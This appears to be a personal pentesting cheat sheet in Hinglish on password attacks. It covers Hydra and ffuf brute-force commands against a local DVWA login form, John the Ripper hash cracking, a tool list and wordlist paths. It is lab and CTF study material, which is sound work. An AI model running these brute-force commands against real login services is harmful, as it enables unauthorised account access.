# Password Attacks & Brute Force

## 1. Hydra (Network Login Brute Force)

```bash
hydra -l username -P wordlist.txt server service
```

| Option | Description |
|---|---|
| `-l username` | Single username |
| `-L users.txt` | Username list file |
| `-p password` | Single password |
| `-P wordlist.txt` | Password list file |
| `-s PORT` | Non-default port specify karo |
| `-V` / `-vV` | Verbose — har attempt dikhao |
| `-t n` | Parallel threads ki tadaad |
| `-d` | Debug mode |
| `-f` | Pehli valid password milte hi stop |
| `-w n` | Connections ke beech wait time |

### Real Example — HTTP Form Brute Force (DVWA style)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 42001 http-get-form \
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=423f81ad12278a9e9fe852a5c47a7bac; security=low:S=Welcome to the password protected area"
```
Use case: Web login form par brute force — `^USER^`/`^PASS^` placeholders hain, `S=` success-string define karti hai (yani agar yeh text response mein aaye to password correct tha), session cookie zaroori hai page access ke liye.

---

## 2. FFUF for Password Fuzzing

```bash
ffuf -u 'http://127.0.0.1:42001/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login' \
     -w /usr/share/wordlists/rockyou.txt \
     -H 'Cookie: PHPSESSID=423f81ad12278a9e9fe852a5c47a7bac; security=low' \
     -fs 4384,4436
```
Use case: Hydra ka alternative — `-fs` se specific response sizes ko filter-out karo (jo wrong-password page ke equal size hain), baki jo bache wahi likely correct password hai.

---

## 3. Hash Cracking

```bash
hash-identifier                                          # pehle hash ka type pata karo
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt                                      # cracked passwords dikhao
```
Use case: Jab CTF mein sirf ek hash mile — pehle uska type identify karo (length/format se), phir John the Ripper ko matching wordlist ke saath chalao.

---

## 4. Common Tools (Reference List)

| Tool | Purpose |
|---|---|
| Hydra | Network service brute force |
| Medusa | Hydra jaisa alternative |
| Ncrack | Network authentication cracking |
| CrackMapExec / NetExec (CME) | Windows/AD environments ke liye |
| Burp Suite Intruder | Web login brute force (GUI) |
| Hashcat / John the Ripper | Offline hash cracking |
| Have I Been Pwned | Leaked credentials check karna |
| CrackStation | Online hash lookup |

---

## 5. Common Wordlist Paths
```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/
```

## 6. Misc Example
```bash
expr length "faizan"
```
Use case: Kisi string/password ki length jaldi nikalni ho to yeh command use karo.
